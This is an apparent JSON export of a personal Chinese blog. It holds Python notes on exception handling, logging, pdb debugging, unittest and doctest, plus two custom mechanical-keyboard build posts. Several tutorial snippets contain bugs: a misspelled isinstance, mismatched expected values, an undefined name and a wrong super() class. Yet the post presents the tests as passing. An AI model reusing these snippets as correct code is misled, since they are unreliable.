也就是如果开启，那么对象中包含的非ASCII字符将被直接保存而不进行转义","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"进阶","slug":"进阶","permalink":"http://enderxiao.github.io/tags/%E8%BF%9B%E9%98%B6/"},{"name":"IO编程","slug":"IO编程","permalink":"http://enderxiao.github.io/tags/IO%E7%BC%96%E7%A8%8B/"}]},{"title":"MDA破晓","slug":"MDA破晓","date":"2021-08-07T01:16:09.000Z","updated":"2024-07-30T11:26:33.911Z","comments":true,"path":"2021/08/07/MDA破晓/","permalink":"http://enderxiao.github.io/2021/08/07/MDA%E7%A0%B4%E6%99%93/","excerpt":"等了一年的键帽他也来了","text":"等了一年的键帽他也来了 写在开头 很久之前，入了一款由MelGeek设计的木镶铜套件，当时就是想尝试以下木壳，但是搭配键帽成了一个很大的问题。 本来想搭配MG尤达，被它的个性吸引了，但是当时手头没啥钱，于是错过了。 MG微光和破晓也是不错的选择，但也错过了。 这次MelGeek复刻MDA版本的微光，且可以按配列购买，实属人性化啊，说什么也不能错过。 众所周知，没有人会记住按时发货的伞兵，这款等了将近一年的键帽也终于到我手上了。 MDA微光的包装 原来的样子 原键盘 本来使用的是由阿尔伯特外设设计的原厂高度的十样锦，当时急着用，于是没有购买JDA高度的。这套原厂高度的实属一般。 之后购入了MDA塑料，觉得MDA高度的键帽无论是高度还是手感都非常帮，键帽表面比较细腻，有种少女肌肤的感觉(/▽＼) 上机 这把键盘的内胆是我入坑第一把键盘的内胆，如今已是伊拉克呈色，黄铜定位板加耳朵橘v2+Z紫+怒猫cyberpunk轴+box Jade的混轴 满满的沧桑 露轴 装上破晓 破晓上机 换上MDA后原本套件存在的BackSpace键卡外壳的问题得到了一定的改善。由于MDA高度的键帽比我原来的键帽更厚实，因此声音也得到了一定的改善。 重点是，这个触感，awsl(❤´艸｀❤)","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"键盘","slug":"键盘","permalink":"http://enderxiao.github.io/categories/%E9%94%AE%E7%9B%98/"},{"name":"客制化","slug":"键盘/客制化","permalink":"http://enderxiao.github.io/categories/%E9%94%AE%E7%9B%98/%E5%AE%A2%E5%88%B6%E5%8C%96/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"客制化","slug":"客制化","permalink":"http://enderxiao.github.io/tags/%E5%AE%A2%E5%88%B6%E5%8C%96/"},{"name":"机械键盘","slug":"机械键盘","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E6%A2%B0%E9%94%AE%E7%9B%98/"},{"name":"键帽","slug":"键帽","permalink":"http://enderxiao.github.io/tags/%E9%94%AE%E5%B8%BD/"},{"name":"MDA破晓","slug":"MDA破晓","permalink":"http://enderxiao.github.io/tags/MDA%E7%A0%B4%E6%99%93/"}]},{"title":"python进阶-调试与测试","slug":"python进阶-调试与测试","date":"2021-08-06T03:39:13.000Z","updated":"2024-07-30T11:26:33.920Z","comments":true,"path":"2021/08/06/python进阶-调试与测试/","permalink":"http://enderxiao.github.io/2021/08/06/python%E8%BF%9B%E9%98%B6-%E8%B0%83%E8%AF%95%E4%B8%8E%E6%B5%8B%E8%AF%95/","excerpt":"python学习笔记，调试与测试","text":"python学习笔记，调试与测试 错误处理 许多高级语言中都内置了一套try...exceot...finally...的错误处理机制，比如java中的try...catch，python中也包含一套用于错误处理的代码。 try 和java中的一样，解释器会先执行try关键字中的代码，如果在某处出错，则会立即停止继续执行try中的代码段落，而转去执行对应except中的代码段，执行完后，将跳过else，如果有finally，则会执行finally中的代码。 如果没有发生错误。则解释器会执行完try、else和finally中的所有内容 12345678910111213try: print(&#x27;try...&#x27;) f = 10/int(x) print(&#x27;result:&#x27;, r)except ValueError as e: print(&#x27;ValueError:&#x27;, e)except ZeroDivisionError as e: print(&#x27;ZeroDivisionError:&#x27;, e)else: print(&#x27;no error!&#x27;)finally: print(&#x27;finally...&#x27;)print(&#x27;END&#x27;) 当x输入0时，语句f = 10/int(x)会出现除0错误，此时直接跳转到第7行继续执行，因此最终结果为： 1234try...ZeroDivisionError: division by zerofinally...END 当x输入a，或者其他不能转化为数字的字符时，int(x)就会出现参数错误，此时直接跳转到第5行执行，因此最终结果为： 1234try...ValueError: invalid literal for int() with base 10: xfinally...END 但当我们输入正确值时，比如输入2，则不会发生异常，从而得到以下结果： 12345try...result: 5no error!finally...END 与java一样，python中的异常也是类，并且有继承关系，所有异常均继承自BaseException，这一特性导致当我们用某一类型去捕获一个异常时，如果遇到该类型异常的子类异常，也会将其捕获： 123456try: foo()except ValueError as e: print(&#x27;ValueError&#x27;)except UnicodeError as e: print(&#x27;UnicodeError&#x27;) 由于UnicodeError是ValueError类型异常的子类异常，因此第5行之后的代码将永远无法出发，发生UnicodeError异常时，它将优先被写在前面且可以捕获该异常的第三行except捕获。 常见异常继承关系可参考python3官方文档： python3异常继承关系https://docs.python.org/3/library/exceptions.html#exception-hierarchy 点击查看异常继承关系 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364BaseException +-- SystemExit +-- KeyboardInterrupt +-- GeneratorExit +-- Exception +-- StopIteration +-- StopAsyncIteration +-- ArithmeticError | +-- FloatingPointError | +-- OverflowError | +-- ZeroDivisionError +-- AssertionError +-- AttributeError +-- BufferError +-- EOFError +-- ImportError | +-- ModuleNotFoundError +-- LookupError | +-- IndexError | +-- KeyError +-- MemoryError +-- NameError | +-- UnboundLocalError +-- OSError | +-- BlockingIOError | +-- ChildProcessError | +-- ConnectionError | | +-- BrokenPipeError | | +-- ConnectionAbortedError | | +-- ConnectionRefusedError | | +-- ConnectionResetError | +-- FileExistsError | +-- FileNotFoundError | +-- InterruptedError | +-- IsADirectoryError | +-- NotADirectoryError | +-- PermissionError | +-- ProcessLookupError | +-- TimeoutError +-- ReferenceError +-- RuntimeError | +-- NotImplementedError | +-- RecursionError +-- SyntaxError | +-- IndentationError | +-- TabError +-- SystemError +-- TypeError +-- ValueError | +-- UnicodeError | +-- UnicodeDecodeError | +-- UnicodeEncodeError | +-- UnicodeTranslateError +-- Warning +-- DeprecationWarning +-- PendingDeprecationWarning +-- RuntimeWarning +-- SyntaxWarning +-- UserWarning +-- FutureWarning +-- ImportWarning +-- UnicodeWarning +-- BytesWarning +-- ResourceWarning 此外，和java一样，python中的异常处理机制也支持多层调用： 12345678910111213def foo(s): return 10 / int(s)def bar(s): return foo(s) * 2def main(): try: bar(&#x27;0&#x27;) except Exception as e: print(&#x27;Error:&#x27;, e) finally: print(&#x27;finally...&#x27;) foo()函数如果发生异常，在main函数中就能被捕捉到，不需要每层到写try...except 因此在查找错误的源头时，调用栈非常重要。 例如： 1234567891011# err.py:def foo(s): return 10 / int(s)def bar(s): return foo(s) * 2def main(): bar(&#x27;0&#x27;)main() 执行，结果如下： 1234567891011&gt;&gt;&gt; python3 err.pyTraceback (most recent call last): File &quot;err.py&quot;, line 11, in &lt;module&gt; main() File &quot;err.py&quot;, line 9, in main bar(&#x27;0&#x27;) File &quot;err.py&quot;, line 6, in bar return foo(s) * 2 File &quot;err.py&quot;, line 3, in foo return 10 / int(s)ZeroDivisionError: division by zero 出错并不可怕，可怕的是不知道哪里出错了。解读错误信息是定位错误的关键。我们从上往下可以看到整个错误的调用函数链： 错误信息第1行： 1Traceback (most recent call last): 告诉我们这是错误的跟踪信息。 第2~3行： 12File &quot;err.py&quot;, line 11, in &lt;module&gt; main() 调用main()出错了，在代码文件err.py的第11行代码，但原因是第9行： 12File &quot;err.py&quot;, line 9, in main bar(&#x27;0&#x27;) 调用bar('0')出错了，在代码文件err.py的第9行代码，但原因是第6行： 12File &quot;err.py&quot;, line 6, in bar return foo(s) * 2 原因是return foo(s) * 2这个语句出错了，但这还不是最终原因，继续往下看： 12File &quot;err.py&quot;, line 3, in foo return 10 / int(s) 原因是return 10 / int(s)这个语句出错了，这是错误产生的源头，因为下面打印了： 1ZeroDivisionError: integer division or modulo by zero 根据错误类型ZeroDivisionError，我们判断，int(s)本身并没有出错，但是int(s)返回0，在计算10 / 0时出错，至此，找到错误源头。 出错的时候，一定要分析错误的调用栈信息，才能定位错误的位置。 错误记录 如果我们既想要记录错误，有希望代码能够继续允许，可以使用python为我们提供的logging库 123456789101112131415161718# err_logging.pyimport loggingdef foo(s): return 10 / int(s)def bar(s): return foo(s) * 2def main(): try: bar(&#x27;0&#x27;) except Exception as e: logging.exception(e)main()print(&#x27;END&#x27;) 程序打印完异常信息后会继续执行，并正常退出： 1234567891011&gt;&gt;&gt; python3 err_logging.pyERROR:root:division by zeroTraceback (most recent call last): File &quot;err_logging.py&quot;, line 13, in main bar(&#x27;0&#x27;) File &quot;err_logging.py&quot;, line 9, in bar return foo(s) * 2 File &quot;err_logging.py&quot;, line 6, in foo return 10 / int(s)ZeroDivisionError: division by zeroEND 通过配置，logging还可以把错误记录到日志文件里，方便事后排查。 抛出错误 既然错误时类，这就意味着我们可以定义自己的异常，并在适当的时候抛出： 1234567891011# err_raise.pyclass FooError(ValueError): passdef foo(s): n = int(s) if n==0: raise FooError(&#x27;invalid value: %s&#x27; % s) return 10 / nfoo(&#x27;0&#x27;) 执行该文件得到结果： 1234567&gt;&gt;&gt; python3 err_raise.py Traceback (most recent call last): File &quot;err_throw.py&quot;, line 11, in &lt;module&gt; foo(&#x27;0&#x27;) File &quot;err_throw.py&quot;, line 8, in foo raise FooError(&#x27;invalid value: %s&#x27; % s)__main__.FooError: invalid value: 0 但除非必须，否则还是推荐使用python内置的错误类型。 此外，有时我们使代码高内聚松耦合，不会在出错的地方就地处理异常，而是将其抛出，让更高层级去处理，所以有时我们会这么写： 12345678910111213141516# err_reraise.pydef foo(s): n = int(s) if n==0: raise ValueError(&#x27;invalid value: %s&#x27; % s) return 10 / ndef bar(): try: foo(&#x27;0&#x27;) except ValueError as e: print(&#x27;ValueError!&#x27;) raisebar() raise语句如果不带参数，就会把当前错误原样抛出。 在except中raise一个Error，还可以用来把一种类型的错误转化成另一种类型： 1234try: 10 / 0except ZeroDivisionError: raise ValueError(&#x27;input error!&#x27;) 注意不要将一个错误转换为好不相关的错误，比如IOError转换成ValueError。 调试 调试能力对于一个工具来说十分重要，因为大多数情况下，我们写的代码不能一次通过，需要反复调试该bug。Python也有自己的调试方法。 print 最快捷的调试方式我认为就是使用print来检查哪个值出了问题，或是在哪个地方出了问题，初学者也会经常使用。 但是使用print会带来一个问题，就是测试完毕要删掉他们，如果不删掉。结果会产生大量。 断言 于是python中提供了一种代替print的方法assert断言 1234567def foo(s): n = int(s) assert n != 0, &#x27;n is zero!&#x27; return 10 / ndef main(): foo(&#x27;0&#x27;) assert的意思是，表达式n != 0应该是True，否则，根据程序运行的逻辑，后面的代码肯定会出错。 如果断言失败，assert语句本身就会抛出AssertionError： 1234$ python err.pyTraceback (most recent call last): ...AssertionError: n is zero! 程序中如果到处充斥着assert，和print()相比也好不到哪去。不过，启动Python解释器时可以用-O参数来关闭assert： 1234$ python -O err.pyTraceback (most recent call last): ...ZeroDivisionError: division by zero logging 把print()替换为logging是第3种方式，和assert比，logging不会抛出错误，而且可以输出到文件： 1234567# Hello.pyimport loggings = &#x27;0&#x27;n = int(s)logging.info(&#x27;n = %d&#x27; % n)print(10 / n) 输出如下： 1234Traceback (most recent call last): File &quot;E:\\Programing\\Python\\Hello\\Hello.py&quot;, line 7, in &lt;module&gt; print(10 / n)ZeroDivisionError: division by zero 我们发先只有错误类型，想要输出的logging.info('n = %d' % n)并没有输出。 需要做如下设置： 12345678# Hello.pyimport logginglogging.basicConfig(level=logging.INFO)s = &#x27;0&#x27;n = int(s)logging.info(&#x27;n = %d&#x27; % n)print(10 / n) 结果如下： 12345INFO:root:n = 0Traceback (most recent call last): File &quot;E:\\Programing\\Python\\Hello\\Hello.py&quot;, line 8, in &lt;module&gt; print(10 / n)ZeroDivisionError: division by zero 这就是logging的好处，它允许你指定记录信息的级别，有DEBUG，INFO，WARNING，ERROR等几个级别，当我们指定level=INFO时，logging.debug就不起作用了。同理，指定level=WARNING后，debug和info就不起作用了。这样一来，你可以放心地输出不同级别的信息，也不用删除，最后统一控制输出哪个级别的信息。 logging的另一个好处是通过简单的配置，一条语句可以同时输出到不同的地方，比如console和文件。 pbd 第4种方式是启动Python的调试器pdb，让程序以单步方式运行，可以随时查看运行状态。 对于如下代码： 1234# Hellp.pys = &#x27;0&#x27;n = int(s)print(10 / n) 用如下方式运行代码： 1$ python -m pdb Hello.py 得到如下结果： 123&gt; e:\\programing\\python\\hello\\hello.py(3)&lt;module&gt;()-&gt; s = &#x27;0&#x27;(Pdb) 输入命令l来查看代码： 12345678(Pdb) l 1 # -*- coding: utf-8 -*- 2 3 -&gt; s = &#x27;0&#x27; 4 n = int(s) 5 print(10 / n)[EOF](Pdb) 输入命令n可以单步执行代码： 1234567(Pdb) n&gt; e:\\programing\\python\\hello\\hello.py(4)&lt;module&gt;()-&gt; n = int(s)(Pdb) n&gt; e:\\programing\\python\\hello\\hello.py(5)&lt;module&gt;()-&gt; print(10 / n)(Pdb) 任何时候都可以输入命令p 变量名来查看变量： 1234(Pdb) p s&#x27;0&#x27;(Pdb) p n0 输入命令q结束调试，退出程序： 1(Pdb) q 这种通过pdb在命令行调试的方法理论上是万能的，但实在是太麻烦了，如果有一千行代码，要运行到第999行得敲多少命令啊。还好，我们还有另一种调试方法。 pdb.set_trace() 这个方法也是用pdb，但是不需要单步执行，我们只需要import pdb，然后，在可能出错的地方放一个pdb.set_trace()，就可以设置一个断点： 1234567# Hello.pyimport pdbs = &#x27;0&#x27;n = int(s)pdb.set_trace() # 运行到这里会自动暂停print(10 / n) 运行代码，程序会自动在pdb.set_trace()暂停并进入pdb调试环境，可以用命令p查看变量，或者用命令c继续运行： 123456789101112$ python Hello.py&gt; e:\\programing\\python\\hello\\hello.py(7)&lt;module&gt;()-&gt; print(10 / n)(Pdb) p n0(Pdb) p s&#x27;0&#x27;(Pdb) cTraceback (most recent call last): File &quot;E:\\Programing\\Python\\Hello\\Hello.py&quot;, line 7, in &lt;module&gt; print(10 / n)ZeroDivisionError: division by zero IDE 最后，还能使用许多支持调式功能的IDE，设置断点只需要点一下就行了，十分方便 比如VSCode、PyCharm等等。 单元测试 例如我们编写一个可以通过属性来访问的dict： 12345678910111213# mydict.pyclass MyDict(dict): def __init__(self,**kw): super().__init__(**kw) def __getattr__(self, key): try: return self[key] except KeyError: raise AttributeError(r&quot;&#x27;Dict&#x27; object has no attribute &#x27;%s&#x27;&quot; % key) def __setattr__(self, key, value): self[key] = value 对于如上类，我们需要测试如下内容： 能否正常创建并通过访问属性的方式访问 能否通过普通dict的方式赋值，并通过属性的方式访问 能否通过设置属性的方式进行赋值 以普通dict方式访问不存在的key值能否正常报KeyError异常 以属性方式访问时，能否正常报AttributeError异常 1234567891011121314151617181920212223242526272829303132import unittestfrom mydict import MyDictclass TestDict(unittest.TestCase): def test_init(self): d = MyDict(a = 1, b = &#x27;test&#x27;) self.assertEqual(d.a, 1) self.assertEqual(d.b, &#x27;test&#x27;) self.assertTrue(insinstance(d, dict)) def test_key(self): d = MyDict() d[&#x27;key&#x27;] = &#x27;value&#x27; self.assertEqual(d.key, &#x27;Value&#x27;) def test_attr(self): d = MyDict() d.key = &#x27;value&#x27; self.assertTrue(key in d) self.assertEqual(d[&#x27;key&#x27;], &#x27;Value&#x27;) def test_keyerror(self): d = MyDict() with self.assertRaises(KeyError): value = d[&#x27;empty&#x27;] def test_attrerror(slef): d = MyDict() with self.assertRaises(AttributeError): value = d.empty 编写单元测试时，需要编写一个单元测试类，从unittest.TestCase继承。 以test开头的方法就是测试方法，不以test开头的方法不被认为是测试方法，测试的时候不会被执行。 其中类似assertEqual的属性则是unittest.TestCase为我们提供的断言，用来判断输出是否符合我们的期望。assertEqual用来判断返回结果是否与预期结果相符。 1self.assertEqual(abs(-1), 1) # 断言函数返回的结果与1相等 assertRaises用来判断指定语句抛出的异常是否是预期类型的异常。 12with self.assertRaises(AttributeError): value = d.empty with的使用详见python基础 - Ender (enderxiao.top) 之后我们需要做的是就是运行测试。最简单的运行方式是在mydict_test.py的最后加上两行代码： 12if __name__ == &#x27;__main__&#x27;: unittest.main() 这样就可以把mydict_test.py当做正常的python脚本运行： 1$ python mydict_test.py 另一种方法是在命令行通过参数-m unittest直接运行单元测试： 123456$ python -m unittest mydict_test.....----------------------------------------------------------------------Ran 5 tests in 0.000sOK 这是推荐的做法，因为这样可以一次批量运行很多单元测试，并且，有很多工具可以自动来运行这些单元测试。 另外，可以在单元测试中编写两个特殊的setUp()和tearDown()方法。这两个方法会分别在每调用一个测试方法的前后分别被执行。 setUp()和tearDown()方法有什么用呢？设想你的测试需要启动一个数据库，这时，就可以在setUp()方法中连接数据库，在tearDown()方法中关闭数据库，这样，不必在每个测试方法中重复相同的代码： 1234567class TestDict(unittest.TestCase): def setUp(self): print(&#x27;setUp...&#x27;) def tearDown(self): print(&#x27;tearDown...&#x27;) 可以再次运行测试看看每个测试方法调用前后是否会打印出setUp...和tearDown...。 文档测试 如果你经常阅读Python的官方文档，可以看到很多文档都有示例代码。比如re模块就带了很多示例代码： 1234&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.search(&#x27;(?&lt;=abc)def&#x27;, &#x27;abcdef&#x27;)&gt;&gt;&gt; m.group(0)&#x27;def&#x27; 可以把这些示例代码在Python的交互式环境下输入并执行，结果与文档中的示例代码显示的一致。 这些代码与其他说明可以写在注释中，然后，由一些工具来自动生成文档。既然这些代码本身就可以粘贴出来直接运行，并且通过某些方式可以自动执行写在注释中的这些代码。 Python内置的“文档测试”（doctest）模块可以直接提取注释中的代码并执行测试。 doctest严格按照Python交互式命令行的输入和输出来判断测试结果是否正确。只有测试异常的时候，可以用...表示中间一大段烦人的输出。 例如对上一章中的MyDict进行测试可以这样进行： 123456789101112131415161718192021222324252627282930313233343536373839# Hello.pyclass MyDict(dict): &#x27;&#x27;&#x27; Simple dict but also support access as x.y style. &gt;&gt;&gt; d1 = MyDict() &gt;&gt;&gt; d1[&#x27;x&#x27;] = 100 &gt;&gt;&gt; d1.x 100 &gt;&gt;&gt; d1.y = 200 &gt;&gt;&gt; d1[&#x27;y&#x27;] 200 &gt;&gt;&gt; d2 = MyDict(a=1, b=2, c=&#x27;3&#x27;) &gt;&gt;&gt; d2.c &#x27;3&#x27; &gt;&gt;&gt; d2[&#x27;empty&#x27;] Traceback (most recent call last): ... KeyError: &#x27;empty&#x27; &gt;&gt;&gt; d2.empty Traceback (most recent call last): ... AttributeError: &#x27;MyDict&#x27; object has no attribute &#x27;empty&#x27; &#x27;&#x27;&#x27; def __init__(self, **kw): super(Dict, self).__init__(**kw) def __getattr__(self, key): try: return self[key] except KeyError: raise AttributeError(r&quot;&#x27;MyDict&#x27; object has no attribute &#x27;%s&#x27;&quot; % key) def __setattr__(self, key, value): self[key] = valueif __name__==&#x27;__main__&#x27;: import doctest doctest.testmod() 运行： 1$ python Hello.py 什么输出也没有。这说明我们编写的doctest运行都是正确的。如果程序有问题，比如把__getattr__()方法注释掉，再运行就会报错： 123456789101112131415161718192021222324252627$ python Hello.py**********************************************************************File &quot;E:\\Programing\\Python\\Hello\\Hello.py&quot;, line 8, in __main__.MyDictFailed example: d1.xException raised: Traceback (most recent call last): File &quot;C:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.9_3.9.1520.0_x64__qbz5n2kfra8p0\\lib\\doctest.py&quot;, line 1336, in __run exec(compile(example.source, filename, &quot;single&quot;, File &quot;&lt;doctest __main__.MyDict[2]&gt;&quot;, line 1, in &lt;module&gt; d1.x AttributeError: &#x27;MyDict&#x27; object has no attribute &#x27;x&#x27;**********************************************************************File &quot;E:\\Programing\\Python\\Hello\\Hello.py&quot;, line 14, in __main__.MyDictFailed example: d2.cException raised: Traceback (most recent call last): File &quot;C:\\Program Files\\WindowsApps\\PythonSoftwareFoundation.Python.3.9_3.9.1520.0_x64__qbz5n2kfra8p0\\lib\\doctest.py&quot;, line 1336, in __run exec(compile(example.source, filename, &quot;single&quot;, File &quot;&lt;doctest __main__.MyDict[6]&gt;&quot;, line 1, in &lt;module&gt; d2.c AttributeError: &#x27;MyDict&#x27; object has no attribute &#x27;c&#x27;**********************************************************************1 items had failures: 2 of 9 in __main__.MyDict***Test Failed*** 2 failures. 注意到最后3行代码。当模块正常导入时，doctest不会被执行。只有在命令行直接运行时，才执行doctest。所以，不必担心doctest会在非测试环境下执行。","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"进阶","slug":"进阶","permalink":"http://enderxiao.github.io/tags/%E8%BF%9B%E9%98%B6/"},{"name":"异常处理","slug":"异常处理","permalink":"http://enderxiao.github.io/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"name":"调试","slug":"调试","permalink":"http://enderxiao.github.io/tags/%E8%B0%83%E8%AF%95/"},{"name":"测试","slug":"测试","permalink":"http://enderxiao.github.io/tags/%E6%B5%8B%E8%AF%95/"}]},{"title":"BBOX-60-CyberSpace Edition","slug":"BBOX-60-CyberSpace-Edition","date":"2021-08-05T07:46:47.000Z","updated":"2024-07-30T11:26:33.904Z","comments":true,"path":"2021/08/05/BBOX-60-CyberSpace-Edition/","permalink":"http://enderxiao.github.io/2021/08/05/BBOX-60-CyberSpace-Edition/","excerpt":"等了一年的外壳它终于发货了","text":"等了一年的外壳它终于发货了 CyberSpace! 2020年8月1日，由Ulliam 与 buger.work联名设计，JTK生产的Box60 CyberSpace特别版开启团购。 Box60-CyberSpaceEdition01Box60-CyberSpaceEdition02Box60-CyberSpaceEdition03 入坑以来，一直想要一款磨砂透明的外壳，无奈一次又一次错过，例如之前的富贵家的Canoe PC，Think6.5 V2等等一些列非常优秀的设计。之后一个偶然的机会看到这款紫透的壳子，突然就被戳中了，我自己是个非常喜欢紫色的人，所以看到这个款的瞬间就决定下单然而。。。 本来预计的发货时间是2021年2月，但到我手上已经是2021年的8月1号了。 实际上6月份左右同款造型的Box60-KONMOMO Box60-KONMOMO 已经到达了各位玩家的手上，但由于色差的问题，被各位玩家吐槽。于是我开始担心起我购买的版本了。如果不是因为这个，我可能都忘了我买了这个套件。 但是拿到实物之后我还是非常满意的，虽然颜色跟渲染图上多少有些出入吧，但是是我喜欢的颜色。 实物01 紫色的饱和度实际上是比渲染图要高一些的。 既然是梦寐以求的PC键盘，那我怎么也得用上毕生所学，让他尽量完美。 PCB 其实在这把键盘之前我组过一把由韩国TX keyboard工作室设计的eo87，这款套件是TOP结构，手感一致性较好，为了发挥它的优势，我当时买的是焊接的版本，但那其实是我第一次焊接。 然后悲剧发生了，S键位焊接了一颗无法触发的轴上去，在解焊的过程中由于接触焊枪的时间过长，导致焊盘脱落，然后就不敢再动了/(ㄒoㄒ)/~~ 因此呢，这次为了保证不会出现上次的悲剧，还是选择了热插拔的PCB，哎嘿(╹ڡ╹ ) 是一块由mokey设计生产的64PCB Mokey-64PCB 在透过深色的透明外壳观测时，白色PCB会比黑色PCB更加的显眼，能够更好地展现透壳的性感之处。 支持VIA改键，不用和以前的qmk方案一样等半天还要刷进去，插上就能改，着实方便 定位板 其实早就想试试PC定位板了，之前用过铝定，Fr4定位板，和铜定位板，各有各的优势吧，铝定大概是我比较不喜欢的i(*￣;(￣ *) PC定位板声音柔和，且没有金属定位板的震手感。B站大佬用PC定敲出的雨滴声真是太戳我了。 Box-60被说过很多次空腔音很大，看ZF里大佬的修改，以及实验，最终发现，应该是因为Box-60为了丰富趣味性，采用了拼装的设计，这确实让我在收到套件以后的组装过程中有一种装高达的错觉，但是也导致了内部比较多的空隙。这些大块的空隙可能是导致空腔音的原因。B站上也有使用树脂填满空隙优化声音的教程，但是谁让我懒呢(*￣3￣)╭ 于是，盲目分析一波，敲击键盘时，声音首先会在定位板和PCB之间反射，接着才会传到pcb下以及两侧的空腔处，那么，在pcb和定位板之间增加垫片，也许能够解决大部分问题，真是大聪明(￣﹃￣) 但公模的PCB要找到很完美的垫子实属困难，为了支持多变的配列，量产的垫子不是空格处有缺口就是方向键有缺口。 如果定位板厚到能塞满这一区域的话，那也不用操心垫子的问题，于是，几番寻找下来，终于找到了这款狗蛋家的5mmPC定！ 5mm着实挺扎实 嗯~ o(*￣▽￣*)o这个冬瓜白着实冬瓜着实美丽 轴体 这次用被吹爆的青龙轴，由燥极设计，佳达隆代工，一款无论是外观还是手感都非常棒的轴体，3元/颗也不算贵，其实最开始还是被颜值吸引的，毕竟紫色控哎嘿(╹ڡ╹ ) 青龙轴01青龙轴02 到手发现手感和声音着实不错，这款轴有两个版本，主要是润滑上的区别，一个是只润滑小脚和弹簧，一个是CAP润滑，本来是想买CAP润滑的版本但是到手发现自己买错了23333，就用着吧，主要是不知道CAP润滑是个啥东西，想尝尝鲜。 卫星轴 下面有请耳朵选手登场！ 耳朵卫星轴V3 这次选择的是新的耳朵卫星轴v3，在v2的基础上重新开模，增加钢丝垫片，假轴垫片，卫星轴垫片做了假轴与外壳的分离，可玩性和手感又上了一个档次，好用是真的好用，贵也是真的贵/(ㄒoㄒ)/~~ 键帽 akko这几年疯狂出复刻，可谓皆大欢喜。键帽质量不错，价格便宜，配色还都是G*K的高热度配色，杀疯了。 这套就是akko出的霓虹键帽，懂得都懂 耳朵卫星轴V3 虽说是大全套，但是其实支持的配列着实有限，特别是，它没有2U的shift 另外，F和J两个盲打按键的弧度要比其他字母区更大，且没有常规按键替换。 组装 由于这次购买的是热插拔键帽，而且轴体都是已经润滑过的，节省了不少时间，本次组装最花时间的大概就是组装外壳和调教卫星轴了吧，新版的耳朵卫星轴垫子着实多，泰阳22058润滑钢丝，杜邦105+205调配由润滑假轴。 下面是组装过程： 组装01组装02组装03 成品 组好了当然要臭美一下O(∩_∩)O 定位板的均光效果也非常不错 成品01成品02成品03 打字音 这次打字音着实令人满意，有雨滴内味了(/ω＼)……… (/ω•＼) 至此本次组装结束，自己还是比较满意的hhh，期待下次！","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"键盘","slug":"键盘","permalink":"http://enderxiao.github.io/categories/%E9%94%AE%E7%9B%98/"},{"name":"客制化","slug":"键盘/客制化","permalink":"http://enderxiao.github.io/categories/%E9%94%AE%E7%9B%98/%E5%AE%A2%E5%88%B6%E5%8C%96/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"客制化","slug":"客制化","permalink":"http://enderxiao.github.io/tags/%E5%AE%A2%E5%88%B6%E5%8C%96/"},{"name":"BBOX60","slug":"BBOX60","permalink":"http://enderxiao.github.io/tags/BBOX60/"},{"name":"机械键盘","slug":"机械键盘","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E6%A2%B0%E9%94%AE%E7%9B%98/"}]},{"title":"python进阶—函数式编程","slug":"python进阶-函数式编程","date":"2021-08-05T03:39:13.000Z","updated":"2024-07-30T11:26:33.919Z","comments":true,"path":"2021/08/05/python进阶-函数式编程/","permalink":"http://enderxiao.github.io/2021/08/05/python%E8%BF%9B%E9%98%B6-%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/","excerpt":"python学习笔记函数式编程部分","text":"python学习笔记函数式编程部分 函数式 函数式编程是一种抽象程度很高的编程范式，纯粹的函数式编程语言编写的函数是没有变量的，因此，任意一个函数，只要输入确定，输出就是确定的。这种纯函数我们称为没有副作用 为什么说纯函数只要输入确定，输出就能确定呢，因为允许变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入可能得到不同的输出，因此这种函数是有副作用的。 函数式编程的一个特点： 允许函数本身作为参数传入另一个函数，且还允许返回一个函数 需要注意的是，python允许使用变量，因此python不是纯函数式编程语言 高阶函数 python中函数名可以理解为指向函数体的变量，因此，可以将函数名赋值给变量，也可以对函数名重新赋值，例如： 123456789101112&gt;&gt;&gt; abs&lt;build-in function abs&gt;&gt;&gt;&gt; f = abs&gt;&gt;&gt; f&lt;build-in function abs&gt;&gt;&gt;&gt; abs = 10&gt;&gt;&gt; abs10&gt;&gt;&gt; abs(-10)Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in 